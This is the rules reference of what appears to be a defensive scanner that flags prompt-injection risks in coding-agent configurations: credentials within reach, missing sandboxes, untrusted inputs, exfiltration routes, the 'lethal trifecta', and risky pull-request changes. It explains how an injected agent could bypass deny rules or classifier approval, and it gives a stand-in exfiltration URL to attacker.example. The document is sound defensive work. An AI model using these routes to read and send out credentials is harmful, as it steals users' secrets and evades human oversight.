# Rules

Every finding has a stable code, `IFJ-<FAMILY>-<NNN>`; codes are never reused.
Its status follows the level of its family in [`.ifinjected.toml`](policy.md):
`deny` fails `--strict`, `warn` is reported, `allow` is information only.
`ifinjected explain CODE` prints a section.

This file is generated from the rules themselves
(`uv run python -m ifinjected.rules.docs`); a test fails when the two differ.

# How agents are set up

## IFJ-POSTURE-001: Approvals are turned off

The agent runs in a mode that skips permission prompts (Claude Code's
``bypassPermissions``). Every tool call, shell command and MCP call runs without
anyone looking; an injected instruction acts at once. Use this mode only in a
disposable container or VM, never on a machine with your credentials.

Family `posture`, default level `warn`.

Sources: <https://code.claude.com/docs/en/permissions>

## IFJ-POSTURE-002: A classifier approves actions instead of you

The agent runs in a mode where a model decides whether an action may run (Claude
Code's ``auto`` mode). That stops many mistakes, but an approval made by a model can
be argued with: prompt injection is an attack on exactly that kind of judgement.

Family `posture`, default level `warn`.

Sources: <https://code.claude.com/docs/en/permissions>

## IFJ-POSTURE-003: Shell commands run without an OS sandbox

The agent's shell commands run with your full rights: no operating-system sandbox
limits what they read, write or connect to. Deny rules then only cover the commands
the agent recognises; a script it writes and runs is not covered.

Family `posture`, default level `warn`.

Sources: <https://code.claude.com/docs/en/sandboxing>

## IFJ-POSTURE-004: The sandbox is on but cannot run here

The configuration enables the sandbox, but it cannot run on this system (no
bubblewrap on Linux, native Windows). Claude Code then runs commands unsandboxed
unless ``sandbox.failIfUnavailable`` is set: the protection you configured is not
there.

Family `posture`, default level `warn`.

Sources: <https://code.claude.com/docs/en/sandboxing>

## IFJ-POSTURE-005: The sandbox has an escape hatch

Settings let commands run outside the sandbox: commands listed in
``excludedCommands`` always do, and with ``allowUnsandboxedCommands`` (the default) a
command that fails in the sandbox can be retried outside it after a prompt.

Family `posture`, default level `warn`.

Sources: <https://code.claude.com/docs/en/sandboxing>

## IFJ-POSTURE-006: Extra working directories open credential locations

A directory added to the agent's working directories (``additionalDirectories``)
contains credentials, or is your whole home. Files there become readable without a
prompt.

Family `posture`, default level `warn`.

Sources: <https://code.claude.com/docs/en/permissions>


# What agents can read

## IFJ-READ-001: A credential is readable without approval

An injected agent can read this credential without anyone approving anything:
through its file tools inside the working directories, a read-only command such as
``cat`` (which Claude Code runs without a prompt in every mode), an allowed
interpreter, or the shell's inherited environment. Move the credential out of reach,
deny it in the agent's rules *and* its sandbox, or let only a human approve reads.

Family `read`, default level `deny`.

Sources: <https://code.claude.com/docs/en/permissions>

## IFJ-READ-002: Credentials are one approval away

These credentials are readable once someone (or a classifier) approves a single
action. A human prompt is a real barrier only if every prompt is read: an injected
agent asks for exactly the action that reads the file, often in a long session where
approving becomes a reflex. This finding never fails ``--strict`` on its own.

Family `read`, default level `deny` (never more than a warning).

Sources: <https://code.claude.com/docs/en/permissions>

## IFJ-READ-003: A deny rule can be walked around

A rule of the agent denies this file, but another way in is open without a human:
Claude Code's Read deny rules cover its file tools and the commands it recognises,
not a Python or Node script that opens the file itself, and not MCP servers. The rule
gives a false sense of safety, which is worse than none. Only an OS sandbox that
denies the path stops every process.

Family `read`, default level `deny`.

Sources: <https://code.claude.com/docs/en/permissions>

## IFJ-READ-004: The sandbox reads your credentials

The agent runs commands in an OS sandbox, and commands there can still read this
credential: sandboxes such as Claude Code's allow reading most of the machine,
``~/.ssh`` and ``~/.aws`` included, unless told otherwise. With
``autoAllowBashIfSandboxed`` (the default) those commands also run without a
prompt. Turning the sandbox on protects writes and the network, not your secrets.

Family `read`, default level `deny`.

Sources: <https://code.claude.com/docs/en/sandboxing>

## IFJ-READ-005: Agent transcripts are readable

The agent can read its own (or another agent's) transcripts and prompt history.
They are plain text and keep whatever a tool printed in earlier sessions, including a
credential that was read once, so a secret can outlive the file it came from.

Family `read`, default level `deny` (never more than a warning).

Sources: <https://code.claude.com/docs/en/permissions>


# Credentials on this machine

## IFJ-SECRET-001: An SSH key has no passphrase

A private key without a passphrase: copying the file is enough to log in to every
server and push to every Git host that trusts it. With a passphrase, the copy is
useless without it (and ssh-agent can still hold the unlocked key for you).

Family `secret`, default level `warn`.

Sources: <https://man.openbsd.org/ssh-keygen>

## IFJ-SECRET-002: Long-lived cloud credentials are on disk

Cloud credentials that work from anywhere for a long time: AWS static access keys,
gcloud's refresh tokens and application default credentials, Azure CLI tokens and
service principal secrets. Short-lived, SSO-based credentials limit what a copy is
worth.

Family `secret`, default level `warn`.

Sources: <https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-files.html>

## IFJ-SECRET-003: A code or package registry token is on disk

Tokens that push code or publish packages under your name: the GitHub CLI's
login, git's plain-text credential store, netrc, npm, PyPI and Cargo tokens. One of
them in the wrong hands is a supply-chain attack on everyone who installs your
packages.

Family `secret`, default level `warn`.

Sources: <https://git-scm.com/docs/git-credential-store>

## IFJ-SECRET-004: Container or cluster credentials are on disk

Docker registry passwords kept inline in ``config.json`` (only base64-encoded) and
kubeconfig files with tokens or client keys: push images and act on clusters as
you.

Family `secret`, default level `warn`.

Sources: <https://docs.docker.com/reference/cli/docker/login/#credential-stores>

## IFJ-SECRET-005: A developer service token is on disk

Tokens of developer services kept in well-known files: Hugging Face, Supabase,
Terraform Cloud, Vault.

Family `secret`, default level `warn`.

Sources: <https://huggingface.co/docs/huggingface_hub/package_reference/environment_variables>

## IFJ-SECRET-006: A coding agent's own login token is on disk

The coding agents' own credentials. An injected agent can send its token away and
the attacker keeps using your subscription or API key from anywhere.

Family `secret`, default level `warn`.

## IFJ-SECRET-007: A .env file holds application secrets

A ``.env`` file in the workspace, a subdirectory or a directory above it. Coding
agents read project files freely, and ``.gitignore`` does not stop them.

Family `secret`, default level `warn`.

## IFJ-SECRET-008: Browser session cookies can be copied

A browser profile's cookie database. Copied, it signs in to every site you are
signed in to, without a password or a second factor. Firefox keeps cookies
unencrypted; Chrome and Chromium encrypt them with a key your user can read.

Family `secret`, default level `warn`.

Sources: <https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data>

## IFJ-SECRET-009: A password manager is usable without a prompt

A password manager that any process running as you can use while it is unlocked:
``pass`` while gpg-agent holds the key, the 1Password CLI while the app is unlocked.
One command lists every password you have.

Family `secret`, default level `warn`.

## IFJ-SECRET-010: Secrets are in the environment

Variables whose names say they hold a credential are in the environment the agent
inherits. Every command it runs gets them, and one ``env`` prints them all; no file
rule applies to the environment.

Family `secret`, default level `warn`.

## IFJ-SECRET-011: A credential can be used without being read

A socket lets any process running as you use a credential it cannot read:
ssh-agent signs with every loaded key, gpg-agent decrypts while a passphrase is
cached, and a Docker socket you can write to is root on the machine.

Family `secret`, default level `warn`.

Sources: <https://docs.docker.com/engine/security/#docker-daemon-attack-surface>

## IFJ-SECRET-012: A credential file is readable by other users

The file's permission bits let other users on this machine read it, not only you.

Family `secret`, default level `warn`.


# Untrusted input

## IFJ-INPUT-001: Web content comes in without approval

The agent's web tools run without approval, so any page an injected instruction
names comes into its context, and with it the next instruction.

Family `input`, default level `warn`.

Sources: <https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/>

## IFJ-INPUT-002: An MCP server brings in content others write

An MCP server feeds the agent content that other people write: GitHub issues and
pull requests, web pages, chat messages, error reports. Any of it can carry
instructions the agent may follow.

Family `input`, default level `warn`.

Sources: <https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/>

## IFJ-INPUT-003: The repository can start code in the agent

Hooks and MCP servers configured *in the repository* (``.claude/settings.json``,
``.mcp.json``) run on your machine with your access when the agent starts there. A
cloned repository, or a pull request that edits these files, can run its own code
without the agent being injected at all.

Family `input`, default level `warn`.

Sources: <https://code.claude.com/docs/en/mcp>, <https://code.claude.com/docs/en/hooks>


# Ways out

## IFJ-EXFIL-001: Shell commands can reach any host

Shell commands run outside any sandbox, so ``curl``, ``git push`` or a script can
send data to any host on the internet.

Family `exfil`, default level `warn`.

Sources: <https://code.claude.com/docs/en/sandboxing>

## IFJ-EXFIL-002: The sandbox lets data out to hosts that accept uploads

The sandbox's network allowlist includes hosts anyone can upload to: code hosts,
paste sites, object storage, webhooks, or a wildcard. A sandboxed command can
still push a secret to a repository or bucket the attacker controls.

Family `exfil`, default level `warn`.

Sources: <https://code.claude.com/docs/en/sandboxing>

## IFJ-EXFIL-003: Web fetches can carry data out without approval

The agent's web fetch tool runs without approval. Data leaves in the URL: a fetch of
``https://attacker.example/?k=<secret>`` is an upload.

Family `exfil`, default level `warn`.

Sources: <https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/>

## IFJ-EXFIL-004: An MCP server can send data out

An MCP server can write somewhere others can read: open an issue or a comment,
post a message, call an API, load a URL. That is a way out for anything the agent
has read.

Family `exfil`, default level `warn`.

Sources: <https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/>


# MCP servers

## IFJ-MCP-001: A local MCP server runs with your full access

A local (stdio) MCP server is a program on your machine with your rights. The
agent's sandbox does not apply to it, and the agent's rules do not see what it does
with files or the network.

Family `mcp`, default level `warn`.

Sources: <https://code.claude.com/docs/en/sandboxing>

## IFJ-MCP-002: An MCP server is downloaded unpinned at every start

The server is started through ``npx``, ``uvx`` or ``docker run`` without a fixed
version (or with ``@latest``), so whatever the package's newest release contains
runs with your access the next time the agent starts. A hijacked package is a
supply-chain attack that needs no injection.

Family `mcp`, default level `warn`.

## IFJ-MCP-003: MCP tools run without approval

The server's tools run without asking (an allow rule names the server, or the
permission mode skips prompts). Whatever the server can do, an injected instruction
can make it do at once.

Family `mcp`, default level `warn`.

Sources: <https://code.claude.com/docs/en/mcp>


# Hooks

## IFJ-HOOK-001: Hooks and helpers run outside the sandbox

Hooks (commands the agent runs on events) and helpers such as ``apiKeyHelper`` run
with your full access, outside the sandbox. They are yours to review: a hook that
passes tool input to a shell can turn an injected tool call into a command.

Family `hook`, default level `warn`.

Sources: <https://code.claude.com/docs/en/hooks>, <https://code.claude.com/docs/en/sandboxing>


# The lethal trifecta

## IFJ-TRIFECTA-001: Lethal trifecta, and nobody has to approve it

The agent can reach private data, takes in content an attacker can write, and can
send data out, and no human stands in front of any of the three. One poisoned
README, issue or web page can make it read a credential and send it away. Close one
leg: deny the credentials (in the sandbox, not only in rules), or remove the way out
(sandbox network allowlist, no auto-approved upload tools).

Family `trifecta`, default level `deny`.

Sources: <https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/>

## IFJ-TRIFECTA-002: Lethal trifecta behind an approval

All three legs are open, but a human must approve at least one step. That holds
only while every prompt is read; an approved ``curl`` or ``git push`` after reading a
file is all an injection needs.

Family `trifecta`, default level `deny` (never more than a warning).

Sources: <https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/>

## IFJ-TRIFECTA-003: Two legs of the trifecta

Two of the three legs are open. Adding one MCP server, one allow rule or one
credential file completes the trifecta; check again after changing the agent's
setup.

Family `trifecta`, default level `deny` (never more than a warning).

Sources: <https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/>


# Changes in a pull request

## IFJ-DIFF-001: The change gives agents more permission

A pull request adds an allow rule, an extra working directory, an allowed host or
command, or sets a mode that asks less (``bypassPermissions``, ``danger-full-access``,
``never``, ``allow-all``, ``insecure_none``). Every agent that works in the
repository gets it the moment the change is checked out.

Family `diff`, default level `deny`.

## IFJ-DIFF-002: The change removes a deny or ask rule

A pull request removes a deny or ask rule (or a Gemini CLI tool exclusion): what was
refused or asked for runs without a prompt afterwards.

Family `diff`, default level `deny`.

## IFJ-DIFF-003: The change adds an MCP server

A pull request adds an MCP server to committed configuration. A local server is a
program that runs with the user's full access when the agent starts in the
repository; Claude Code under ``claude -p`` connects project servers without asking.

Family `diff`, default level `deny`.

## IFJ-DIFF-004: The change adds or changes a hook or helper

A pull request adds or changes a hook or a helper command (``apiKeyHelper``). It runs
outside any sandbox, with the user's full access, on every matching event.

Family `diff`, default level `deny`.

## IFJ-DIFF-005: The change weakens a sandbox

A pull request turns a sandbox off or lets commands leave it.

Family `diff`, default level `deny`.

## IFJ-DIFF-006: The change redirects an agent's traffic

A pull request sets an environment variable that sends the agent's API or web
traffic somewhere else (``ANTHROPIC_BASE_URL``, ``HTTPS_PROXY``…): everything the
agent sends, prompts and file contents included, can be read there.

Family `diff`, default level `deny`.


# Configuration

## IFJ-CONFIG-001: Agent configuration could not be read

A configuration file of an agent exists but could not be read or understood (not
valid JSON or TOML, too large, permission denied). What the agent may do is then
uncertain: results that depend on it are marked uncertain, never safe.

Family `config`, default level `warn`.
